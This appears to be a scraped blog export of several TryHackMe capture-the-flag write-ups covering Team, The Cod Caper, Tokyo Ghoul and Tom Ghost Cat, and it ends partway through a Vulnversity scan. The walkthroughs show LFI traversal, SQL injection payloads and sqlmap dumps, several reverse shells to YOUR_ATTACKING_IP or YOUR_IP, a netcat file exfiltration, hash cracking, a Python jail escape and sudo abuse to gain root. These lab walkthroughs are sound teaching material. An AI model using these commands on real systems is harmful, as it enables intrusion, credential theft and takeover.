robots.txt is always interesting.\nIs what is shows. Lmao. Probably the ftp username? Password we can brute-forcing. This is another thing we can try.\nLooking at the source, we see /assets and /images. I don\u0026rsquo;t like stego challenges, so I\u0026rsquo;ll keep it for the end.\nWhile that runs, I tried looking around in the website, but nothing special. Same goes for trying out anonymous login in ftp.\n1.3 Sub-Domains I\u0026rsquo;ve also learnt that we should look for subdomains as well. I will use wfuzz. Since this is the first time I\u0026rsquo;m mentioning this, I\u0026rsquo;ll explain all the flags as well :P\n❯ wfuzz -c --hw 977 -w /usr/share/wfuzz/wordlist/general/common.txt -u http://team.thm/ -H \u0026quot;Host: FUZZ.team.thm\u0026quot; --hc 400 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://team.thm/ Total requests: 951 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000257: 200 9 L 20 W 187 Ch \u0026quot;dev\u0026quot; 000000936: 200 89 L 220 W 2966 Ch \u0026quot;www\u0026quot; Total time: 36.97936 Processed Requests: 951 Filtered Requests: 949 Requests/sec.: 25.71704 The results look nice. Okay. One by one.\n -c flag is for colorful output --hw stands for hide words, probably. It was showing a ton of rows with 977, so I hardcoded :D -w wordlist. If you are in kali, you already have it in /usr/share/wfuzz/wordlist/general/common.txt. -u url -H host name. FUZZ gets replaced by the Payload. --hc hides responses having 400 error.  1.4 Web Exploration Pending paths:\n images stego gobuster on /scripts brute-forcing ftp using dale as username.  However, there are tastier things for us right now. Let\u0026rsquo;s go to dev.team.thm from the wfuzz results. Do not forget to include it in /etc/hosts!\nHuh. Let\u0026rsquo;s follow that. It redirects us to the url: http://dev.team.thm/script.php?page=teamshare.php\nBoth of these ideas combined, this looks very much like a LFI. Let\u0026rsquo;s try http://dev.team.thm/script.php?page=../../../../etc/passwd. Since the Apache server is usually around /var/www/html/.\nWorks! We see dale, gyles and some ftpuser. Interesting. Our first target is then to get into dale.\n2. Foothold Okay. Since there was a ssh port open, we can assume dale is the username of that (It could be for ftp as well, who knows!).\nSo, we are looking for either the password of dale, or a private key. Since we have no better option currently, we can brute-forcing paths using burpsuite. Turn on foxy-proxy or any other tool you use, and fire up burp.\nIntercept a request, copypaste it. It looks like\nGET /script.php?page=../../../../etc/passwd HTTP/1.1 Host: dev.team.thm User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Now, go to the intruder tab, and setup as the following:\nI\u0026rsquo;ve put in the payload from here\nNow, you can let it run, but community edition sucks for this. Speed is shit and the thing we are looking for, is towards the bottom of the list. Let me save you some trouble, the path we are looking for, is /etc/ssh/sshd_config. The url thus being http://dev.team.thm/script.php?page=../../../../etc/ssh/sshd_config\nWe see the sweet sweet private key, which means we can get in! Since the formatting is shit, go the source and the copy-paste it. Yeet all the \u0026lsquo;#\u0026rsquo; in the starting.\nWe are in!\n❯ ssh dale@10.10.82.31 -i temp Last login: Mon Jan 18 10:51:32 2021 dale@TEAM:~$ ls user.txt dale@TEAM:~$ cat user.txt THM{HELL YEAH} We are done!\n3. Priv Esc Okay! So the first thing I have learnt to do is check for sudo details.\ndale@TEAM:~$ sudo -l Matching Defaults entries for dale on TEAM: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User dale may run the following commands on TEAM: (gyles) NOPASSWD: /home/gyles/admin_checks Looks good. Let\u0026rsquo;s head over to there and see what we can mess with.\ndale@TEAM:/home/gyles$ cat admin_checks #!/bin/bash printf \u0026quot;Reading stats.\\n\u0026quot; sleep 1 printf \u0026quot;Reading stats..\\n\u0026quot; sleep 1 read -p \u0026quot;Enter name of person backing up the data: \u0026quot; name echo $name \u0026gt;\u0026gt; /var/stats/stats.txt read -p \u0026quot;Enter 'date' to timestamp the file: \u0026quot; error printf \u0026quot;The Date is \u0026quot; $error 2\u0026gt;/dev/null date_save=$(date \u0026quot;+%F-%H-%M\u0026quot;) cp /var/stats/stats.txt /var/stats/stats-$date_save.bak printf \u0026quot;Stats have been backed up\\n\u0026quot; This is clearly a bash script, and those $name and $error variables look interesting.\ndale@TEAM:/home/gyles$ sudo -u gyles /home/gyles/admin_checks Reading stats. Reading stats.. Enter name of person backing up the data: /bin/bash Enter 'date' to timestamp the file: /bin/bash The Date is ls admin_checks whoami gyles Note how I\u0026rsquo;ve snuck in /bin/bash so that $error reads and executes that! Let\u0026rsquo;s also get a proper shell.\npython3 --version Python 3.6.5 python3 -c \u0026quot;import pty; pty.spawn('/bin/bash')\u0026quot; gyles@TEAM:/home/gyles$ Nice. Now, we are done with lateral privesc. Time for linpeas.sh! scp the file over to the machine.\n❯ scp -i path/to/id_rsa /path/to/linpeas.sh dale@10.10.153.126:~ linpeas.sh 100% 313KB 155.7KB/s 00:02 [+] Systemd PATH [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin [+] Searching ssl/ssh files /home/gyles/.ssh/known_hosts PermitRootLogin without-password PubkeyAuthentication yes ChallengeResponseAuthentication no UsePAM no Possible private SSH keys were found! /etc/ssh/sshd_config --\u0026gt; Some certificates were found (out limited): /var/lib/lxd/server.crt /etc/pollinate/entropy.ubuntu.com.pem --\u0026gt; /etc/hosts.allow file found, read the rules: /etc/hosts.allow The sshd_config lmao.\n[+] .sh files in path [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path /usr/local/sbin/dev_backup.sh You can write script: /usr/local/bin/main_backup.sh /usr/bin/gettext.sh [+] Interesting GROUP writable files (not in Home) (max 500) [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files Group gyles: /home/gyles/.local Group editors: /var/stats/stats.txt Group admin: /usr/local/bin /usr/local/bin/main_backup.sh /opt/admin_stuff The last two look the most interesting of the scan results.\ngyles@TEAM:/usr/local/bin$ cat main_backup.sh #!/bin/bash cp -r /var/www/team.thm/* /var/backups/www/team.thm/ Oh baby, this is too easy! Since we have the write access, let\u0026rsquo;s have an interactive bash shell pop up here, and we can connect using nc from the other side. Hell yeah.\ngyles@TEAM:/usr/local/bin$ cat main_backup.sh #!/bin/bash cp -r /var/www/team.thm/* /var/backups/www/team.thm/ bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_ATTACKING_IP/1337 0\u0026gt;\u0026amp;1 ❯ nc -lnvp 1337 listening on [any] 1337 ... connect to [10.8.150.214] from (UNKNOWN) [10.10.153.126] 37192 bash: cannot set terminal process group (25073): Inappropriate ioctl for device bash: no job control in this shell root@TEAM:~# cat /root/root.txt cat /root/root.txt THM{YEEEEEEEEEEEEEE} And we are done!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/OT9fQyi.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-team-final-writeup/","title":"TryHackMe: Team Final Writeup"},{"content":"Task 1: Intro pingu story\nTask 2: Host Enumeration nmap -sC -sV -A 10.10.40.189\n-A: Enable OS detection, version detection, script scanning, and traceroute\n-sC: equivalent to \u0026ndash;script=default\n-sV: Probe open ports to determine service/version info\nScan Results\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-12-31 09:48 IST Nmap scan report for 10.10.40.189 Host is up (0.21s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA) | 256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA) |_ 256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 33.68 seconds 1. How many ports are open on the target machine? 2 (ssh, http)\n2. What is the http-title of the web server? Apache2 Ubuntu Default Page: It works\n3. What version is the ssh service? OpenSSH 7.2p2 Ubuntu 4ubuntu2.8\n4. What is the version of the web server? Apache/2.4.18\nTask 3: Web enumeration Using the suggested wordlist.\nrun: gobuster dir -u 10.10.16.135 -w \u0026quot;path/to/wordlist.txt\u0026quot; -x \u0026quot;html,php,txt\u0026quot;\nIt was around 10% way of searching when it got this!\n1. What is the name of the important file on the server? /administrator.php\n4. Web Exploitation login form -\u0026gt; sql injection?\nrun sqlmap -u http://10.10.16.135/administrator.php --forms --dump\n-u: url\n\u0026ndash;forms: gets parameters from form element in the page\n\u0026ndash;dump: gets data once SQLI(SQLInjection) is found\nWe now get this from sqlmap:\n 3 kinds of blinds  --- Parameter: username (POST) Type: boolean-based blind Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause Payload: username=gbXk' RLIKE (SELECT (CASE WHEN (1352=1352) THEN 0x6762586b ELSE 0x28 END))-- MeOd\u0026amp;password= Type: error-based Title: MySQL \u0026gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET) Payload: username=gbXk' AND GTID_SUBSET(CONCAT(0x71716b6b71,(SELECT (ELT(9508=9508,1))),0x716b6a7171),9508)-- BmZK\u0026amp;password= Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: username=gbXk' AND (SELECT 6145 FROM (SELECT(SLEEP(5)))TqbZ)-- sWNA\u0026amp;password= --- Database entries  Database: users\nTable: users\n[1 entry]\n   password username     secretpass pingudad    1. What is the admin username? pingudad\n2. What is the admin password? secretpass\n3. How many forms of SQLI is the form vulnerable to? 3\n5. Command Execution link where we put commands: http://IP/SOME_NUMBER.php\nwe now run: nc -nlvp 4242 on our machine, to listen for connections\n-l: listen mode, for inbound connects\n-n: numeric-only IP addresses, no DNS\n-p: local port number\n-v: verbose\nand run this command in the administrator command box: nc -e /bin/sh YOUR_IP 4242 Source. well\u0026hellip; that didn\u0026rsquo;t work. let\u0026rsquo;s try: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc YOUR_IP 4242 \u0026gt;/tmp/f Source\nQuick Tip: Get you ip by typing in ifconfig. Since we have connected to a VPN, we have to look at tun0. run: ifconfig tun0 and the destination is your IP address.\nIf that sounds complex, go to https://tryhackme.com/access with VPN connected, and it\u0026rsquo;ll show you want you need.\nQuick Note: you can choose any port, 4242 is arbitary :P\n1. How many files are in the current directory? run ls in the command form (even before we get access)\n3\n2. Do I still have an account? cat /etc/passwd shows pingu:x:1002:1002::/home/pingu:/bin/bash at the end.\nyes\n3. What is my ssh password? Traversing through the directory we have a user named pingu, and in the .ssh folder, we have id_rsa and id_rsa.pub. This is interesting. But, for now lets focus on getting the password. Trying to seach using find -u pingu yields nothing. however, going around the directory we landed into shows a hidden folder; inside is our password! Its owned by www-data though \u0026hellip; hmmm \u0026hellip;.\npinguapingu\nHaving fun running ssh pingu@IP gives us access to the machine, using the password above. and \u0026hellip; well maybe i got too excited\npingu@ubuntu:~$ sudo su [sudo] password for pingu: pingu is not in the sudoers file. This incident will be reported. lmao\n6. LinEnum We need to get the linenum file into pingu\u0026rsquo;s machine now. how? the room mentions using SCP which we can do since we have ssh-ed into the machine.\nGet the linenum script\nAfter copying using: scp /path/to/LinEnum.sh pingu@IP:/tmp, just do chmod +x LinEnum.sh and run.\n1. What is the interesting path of the interesting suid file? /opt/secret/root\n10. Finishing the Job I\u0026rsquo;m on kali and there\u0026rsquo;s the godly rockyou.txt 133mb file in /usr/share/wordlists. If you do not have it, download from here\nOur attack mode is using wordlist, which we can see is labelled 0 in hashcat --help. Looking up out mode, we have sha512crypt $6$, SHA512 (Unix) at 1800. So,\nrun: hashcat -m 1800 -a 0 root.txt /usr/share/wordlists/rockyou.txt\nwe get $6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:love2fish\nlove2fish\n11. Done Have fun!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/Z1wn3xE.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-the-cod-caper-writeup/","title":"TryHackMe: The Cod Caper Writeup"},{"content":"Play\n1. Scanning \u0026amp; Enumeration 1.1 Port Scanning ❯ nmap -sC -sV -A 10.10.202.61 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-17 01:48 EDT Nmap scan report for 10.10.202.61 Host is up (0.19s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxr-xr-x 3 ftp ftp 4096 Jan 23 22:26 need_Help? | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.150.214 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 fa:9e:38:d3:95:df:55:ea:14:c9:49:d8:0a:61:db:5e (RSA) | 256 ad:b7:a7:5e:36:cb:32:a0:90:90:8e:0b:98:30:8a:97 (ECDSA) |_ 256 a2:a2:c8:14:96:c5:20:68:85:e5:41:d0:aa:53:8b:bd (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Welcome To Tokyo goul Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 47.17 seconds 1.2 FTP ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 3 ftp ftp 4096 Jan 23 22:26 need_Help? 226 Directory send OK. ftp\u0026gt; cd need_Help? 250 Directory successfully changed. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 ftp ftp 480 Jan 23 22:26 Aogiri_tree.txt drwxr-xr-x 2 ftp ftp 4096 Jan 23 22:26 Talk_with_me 226 Directory send OK. ftp\u0026gt; get Aogiri_tree.txt ... ftp\u0026gt; cd Talk_with_me 250 Directory successfully changed. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rwxr-xr-x 1 ftp ftp 17488 Jan 23 22:26 need_to_talk -rw-r--r-- 1 ftp ftp 46674 Jan 23 22:26 rize_and_kaneki.jpg 226 Directory send OK. ftp\u0026gt; get need_to_talk ... ftp\u0026gt; get rize_and_kaneki.jpg ... 1.3 File Exploration ❯ file need_to_talk need_to_talk: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=adba55165982c79dd348a1b03c32d55e15e95cf6, for GNU/Linux 3.2.0, not stripped ❯ ./need_to_talk Hey Kaneki finnaly you want to talk Unfortunately before I can give you the kagune you need to give me the paraphrase Do you have what I'm looking for? \u0026gt; no Hmm. I don't think this is what I was looking for. Take a look inside of me. rabin2 -z ❯ strings need_to_talk ... u/UH You_founH d_1t []A\\A]A^A_ {username} ... ❯ ./need_to_talk Hey Kaneki finnaly you want to talk Unfortunately before I can give you the kagune you need to give me the paraphrase Do you have what I'm looking for? \u0026gt; {username} Good job. I believe this is what you came for: {stego pass} ❯ steghide --extract --stegofile rize_and_kaneki.jpg Enter passphrase: wrote extracted data to \u0026quot;yougotme.txt\u0026quot;. ❯ cat yougotme.txt haha you are so smart kaneki but can you talk my code ..... .- ....- ....- ....- -.... --... ----. {truncated} ... if you can talk it allright you got my secret directory Using: CyberChef\nWe have the secret directory!\n1.4 Web Exploration It tells us to scan, so let\u0026rsquo;s do that.\nWe reach at an intersting page, which looks vulnerable to LFI.\nindex.php?view=../../../../etc/passwd\nIntersting! But what about a specially crafted request? Trying the below: index.php?view=%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd\nWe get the good stuff! {username}:{some tasty info mmmmm} \n1.5 Hash Cracking ❯ john --wordlist=\u0026quot;/usr/share/wordlists/rockyou.txt\u0026quot; hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status {password mmmmm} ({username}) 1g 0:00:00:01 DONE (2021-03-17 02:43) 0.7812g/s 1200p/s 1200c/s 1200C/s kucing..mexico1 Use the \u0026quot;--show\u0026quot; option to display all of the cracked passwords reliably Session completed 2. Foothold Using this to ssh, we are in!\nLet\u0026rsquo;s do some exploration.\n{username}@vagrant:~$ sudo -l [sudo] password for {username}: Matching Defaults entries for {username} on vagrant.vm: env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User {username} may run the following commands on vagrant.vm: (ALL) /usr/bin/python3 /home/{username}/jail.py {username}@vagrant:~$ ls -la total 16 drwxr-xr-x 2 root root 4096 Jan 23 22:33 . drwxr-xr-x 4 root root 4096 Jan 23 22:27 .. -rw-r--r-- 1 root root 588 Jan 23 22:27 jail.py -rw-r--r-- 1 root root 33 Jan 23 22:27 user.txt {username}@vagrant:~$ cat jail.py #! /usr/bin/python3 #-*- coding:utf-8 -*- def main(): print(\u0026quot;Hi! Welcome to my world kaneki\u0026quot;) print(\u0026quot;========================================================================\u0026quot;) print(\u0026quot;What ? You gonna stand like a chicken ? fight me Kaneki\u0026quot;) text = input('\u0026gt;\u0026gt;\u0026gt; ') for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']: if keyword in text: print(\u0026quot;Do you think i will let you do this ??????\u0026quot;) return; else: exec(text) print('No Kaneki you are so dead') if __name__ == \u0026quot;__main__\u0026quot;: main() {username}@vagrant:~$ python3 jail.py Hi! Welcome to my world kaneki ======================================================================== What ? You gonna stand like a chicken ? fight me Kaneki \u0026gt;\u0026gt;\u0026gt; hi Traceback (most recent call last): File \u0026quot;jail.py\u0026quot;, line 16, in \u0026lt;module\u0026gt; main() File \u0026quot;jail.py\u0026quot;, line 13, in main exec(text) File \u0026quot;\u0026lt;string\u0026gt;\u0026quot;, line 1, in \u0026lt;module\u0026gt; NameError: name 'hi' is not defined Uh okay, so cheap trick, let\u0026rsquo;s see if sneaking in works.\n\u0026gt;\u0026gt;\u0026gt; \u0026quot;cat root/root.txt\u0026quot; No Kaneki you are so dead Apparently not. What we need to do is import os and spawn a shell, or, just cat the root/root.txt file. But, for that, we need to somehow make python execute shell code. How? Python has a built in function exec() that does just that. So, all we need to do is python3 jail-break. Look up here for more information.\n__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt') And we are done!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/nqdEYNI.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-tokyo-ghoul-writeup/","title":"TryHackMe: Tokyo Ghoul Writeup"},{"content":"Play\nRecon ❯ nmap -sC -sV -A -T4 10.10.218.100 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-04 21:58 EST Nmap scan report for 10.10.218.100 Host is up (0.18s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA) | 256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA) |_ 256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519) 53/tcp open tcpwrapped 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) | ajp-methods: |_ Supported methods: GET HEAD POST OPTIONS 8080/tcp open http Apache Tomcat 9.0.30 |_http-favicon: Apache Tomcat |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat/9.0.30 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.05 seconds This machine shows no port on 80, which explains the reason why Firefox was shouting at me. I looked up for AJP and Tomcat and all such combinations. The exploit seems interesting to look a bit deeper into. This explains the innerworkings of this service and what we could expect going forward. This APJ 13 Vulnerability explains how WEB-INF/web.xml is a good starting point.\nLooking up more, we have this tool, called ajshooter. We see this command plays well with the above explaination. python3 ajpShooter.py http://10.10.218.100:8080 8009 /WEB-INF/web.xml read\nWe get:\n❯ python3 ajpshooter.py http://10.10.218.100:8080 8009 /WEB-INF/web.xml read _ _ __ _ _ /_\\ (_)_ __ / _\\ |__ ___ ___ | |_ ___ _ __ //_\\\\ | | '_ \\ \\ \\| '_ \\ / _ \\ / _ \\| __/ _ \\ '__| / _ \\| | |_) | _\\ \\ | | | (_) | (_) | || __/ | \\_/ \\_// | .__/ \\__/_| |_|\\___/ \\___/ \\__\\___|_| |__/|_| 00theway,just for test [\u0026lt;] 200 200 [\u0026lt;] Accept-Ranges: bytes [\u0026lt;] ETag: W/\u0026quot;1261-1583902632000\u0026quot; [\u0026lt;] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT [\u0026lt;] Content-Type: application/xml [\u0026lt;] Content-Length: 1261 \u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt; \u0026lt;!-- Licensed to the Apache Software Foundation (ASF) under one or more contributor license agreements. See the NOTICE file distributed with this work for additional information regarding copyright ownership. The ASF licenses this file to You under the Apache License, Version 2.0 (the \u0026quot;License\u0026quot;); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \u0026quot;AS IS\u0026quot; BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. --\u0026gt; \u0026lt;web-app xmlns=\u0026quot;http://xmlns.jcp.org/xml/ns/javaee\u0026quot; xmlns:xsi=\u0026quot;http://www.w3.org/2001/XMLSchema-instance\u0026quot; xsi:schemaLocation=\u0026quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026quot; version=\u0026quot;4.0\u0026quot; metadata-complete=\u0026quot;true\u0026quot;\u0026gt; \u0026lt;display-name\u0026gt;Welcome to Tomcat\u0026lt;/display-name\u0026gt; \u0026lt;description\u0026gt; Welcome to GhostCat skyfuck:{haha, password go brr} \u0026lt;/description\u0026gt; \u0026lt;/web-app\u0026gt; With no other port open, its safe to say that those are ssh credentials :D\nFoothold ❯ ssh skyfuck@10.10.218.100 The authenticity of host '10.10.218.100 (10.10.218.100)' can't be established. ECDSA key fingerprint is SHA256:hNxvmz+AG4q06z8p74FfXZldHr0HJsaa1FBXSoTlnss. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.218.100' (ECDSA) to the list of known hosts. skyfuck@10.10.218.100's password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. skyfuck@ubuntu:~$ ls credential.pgp tryhackme.asc skyfuck@ubuntu:/home/merlin$ cat user.txt THM{stonks} PrivEsc Using the commands on the machine skyfuck@ubuntu:~$ cat tryhackme.asc | netcat 10.8.150.214 6969 and ❯ nc -lnvp 6969 \u0026gt; tryhackme.asc on ours, we transfer the files for further inspection.\nWe do the same for credentials.pgp. It looks like we need some passphrase before doing this, so lets do gpg2john and then run john.\n❯ gpg2john tryhackme.asc \u0026gt; hash File tryhackme.asc ❯ cat hash tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme \u0026lt;stuxnet@tryhackme.com\u0026gt;::tryhackme.asc ❯ john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 65536 for all loaded hashes Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes Cost 3 (ciphers algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status alexandru (tryhackme) 1g 0:00:00:00 DONE (2021-03-04 23:51) 1.694g/s 1816p/s 1816c/s 1816C/s theresa..alexandru Use the \u0026quot;--show\u0026quot; option to display all of the cracked passwords reliably Session completed Let\u0026rsquo;s import, this time giving the passphrase\n❯ gpg --import tryhackme.asc gpg: key 8F3DA3DEC6707170: \u0026quot;tryhackme \u0026lt;stuxnet@tryhackme.com\u0026gt;\u0026quot; not changed gpg: key 8F3DA3DEC6707170: secret key imported gpg: key 8F3DA3DEC6707170: \u0026quot;tryhackme \u0026lt;stuxnet@tryhackme.com\u0026gt;\u0026quot; not changed gpg: Total number processed: 2 gpg: unchanged: 2 gpg: secret keys read: 1 gpg: secret keys imported: 1 and now,\n❯ gpg --decrypt cred.pgp gpg: WARNING: ciphers algorithm CAST5 not found in recipient preferences gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11 \u0026quot;tryhackme \u0026lt;stuxnet@tryhackme.com\u0026gt;\u0026quot; merlin:{haha, password go brr} We are done with the lateral movement!\nNow, onto merlin.\n❯ ssh merlin@10.10.218.100 merlin@10.10.218.100's password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Last login: Tue Mar 10 22:56:49 2020 from 192.168.85.1 merlin@ubuntu:~$ sudo -l Matching Defaults entries for merlin on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User merlin may run the following commands on ubuntu: (root : root) NOPASSWD: /usr/bin/zip merlin@ubuntu:~$ gtfobins makes it too easy lmao\nmerlin@ubuntu:~$ TF=$(mktemp -u) merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #' adding: etc/hosts (deflated 31%) # ls user.txt # whoami root we are done!\n# cd /root # ls root.txt ufw # cat root.txt THM{pwned!} ","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/8ALIytx.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-tom-ghost-cat-writeup/","title":"TryHackMe: Tom Ghost Cat Writeup"},{"content":"Play\nTask 1 - Deploy the machine ezpz\nTask 2 - Recon classic nmap scan\n❯ nmap -sC -sV -A 10.10.197.89 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-07 21:43 EST Nmap scan report for 10.10.197.89 Host is up (0.18s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA) | 256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA) |_ 256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 |_http-server-header: squid/3.5.12 |_http-title: ERROR: The requested URL could not be retrieved 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Vuln University Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 